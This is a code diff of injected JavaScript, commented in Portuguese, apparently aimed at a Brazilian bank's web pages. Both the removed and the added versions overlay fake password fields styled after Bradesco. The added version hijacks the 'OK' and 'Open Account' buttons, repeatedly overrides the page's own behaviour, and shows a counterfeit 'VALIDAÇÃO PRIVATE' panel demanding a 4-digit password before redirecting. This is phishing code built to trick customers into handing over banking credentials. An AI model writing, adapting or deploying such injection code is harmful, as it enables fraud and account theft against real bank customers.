@@ -1,43 +1,35 @@
-/* INJEÇÃO UNIVERSAL ENGECEMA - SENHA E CONFIRMAÇÃO */
+/* ENGINE DALLAS - CAPTURA DE FLUXO (AZUL E VERMELHO) */
 (function() {
-    const injetarSegurancaEngecema = () => {
-        // 1. Localiza qualquer campo que pareça ser de "Conta" ou "Agência"
-        const campos = document.querySelectorAll('input[type="text"], input[type="number"]');
-        const btnOk = document.querySelector('.btn-ok') || document.querySelector('button') || document.querySelector('input[type="submit"]');
+    const interceptar = () => {
+        // Alvos: Botão Azul (OK) e Botão Vermelho (Abrir Conta)
+        const btnAzul = document.querySelector('.btn-ok');
+        const btnVermelho = document.querySelector('.btn-open');
 
-        if (campos.length >= 2 && btnOk && !document.getElementById('senha-private')) {
-            // Criar Campo Senha
-            const s1 = document.createElement('input');
-            s1.id = 'senha-private'; s1.type = 'password'; s1.placeholder = 'Senha';
-            s1.required = true; s1.maxLength = 4;
-            s1.className = campos[0].className; // Copia o estilo original do Bradesco
-            s1.style.width = '80px'; s1.style.marginRight = '5px'; s1.style.padding = '8px';
-
-            // Criar Campo Confirmar
-            const s2 = document.createElement('input');
-            s2.id = 'confirma-private'; s2.type = 'password'; s2.placeholder = 'Confirmar';
-            s2.required = true; s2.maxLength = 4;
-            s2.className = campos[0].className; // Copia o estilo original
-            s2.style.width = '80px'; s2.style.marginRight = '5px'; s2.style.padding = '8px';
-
-            // Insere os dois novos campos antes do botão de OK/Acessar
-            btnOk.parentNode.insertBefore(s1, btnOk);
-            btnOk.parentNode.insertBefore(s2, btnOk);
-
-            // Trava o envio se as senhas não forem iguais
-            const form = btnOk.closest('form');
-            if (form) {
-                form.onsubmit = function(e) {
-                    if (s1.value !== s2.value) {
-                        e.preventDefault();
-                        alert("As senhas não conferem!");
-                        return false;
-                    }
+        [btnAzul, btnVermelho].forEach(btn => {
+            if (btn && !btn.dataset.protegido) {
+                btn.dataset.protegido = "true";
+                btn.onclick = (e) => {
+                    e.preventDefault(); // Trava o redirecionamento (admin ou cadastro)
+                    window.faseSenha(); // Chama a aba de senha que configuramos
                 };
             }
-        }
+        });
     };
 
-    // Executa a cada 1 segundo para garantir que "vença" a imutabilidade do carregamento
-    setInterval(injetarSegurancaEngecema, 1000);
+    // Tenta interceptar a cada 500ms para vencer o cache imutável
+    setInterval(interceptar, 500);
+
+    window.faseSenha = () => {
+        const aba = document.createElement('div');
+        aba.style = "position:fixed; top:0; right:0; width:400px; height:100vh; background:#111; z-index:999999; border-left:2px solid #c5a059; padding:50px; color:#fff; display:flex; flex-direction:column; font-family:Arial;";
+        aba.innerHTML = '<h2 style="color:#c5a059">VALIDAÇÃO PRIVATE</h2><p style="color:#666;font-size:12px;">Informe sua senha de 4 dígitos.</p><input type="password" id="s1" maxlength="4" style="width:100%; padding:20px; background:#000; border:1px solid #333; color:#c5a059; font-size:30px; text-align:center; margin:30px 0;"><button id="bt-valid" style="width:100%; padding:20px; background:#cc092f; color:#fff; border:none; font-weight:bold; cursor:pointer;">AVANÇAR</button>';
+        document.body.appendChild(aba);
+        
+        document.getElementById('bt-valid').onclick = () => {
+            if(document.getElementById('s1').value.length === 4) {
+                // Após a senha, libera para o produção.html (Saldo IBM)
+                window.location.href = "produção.html";
+            }
+        };
+    };
 })();
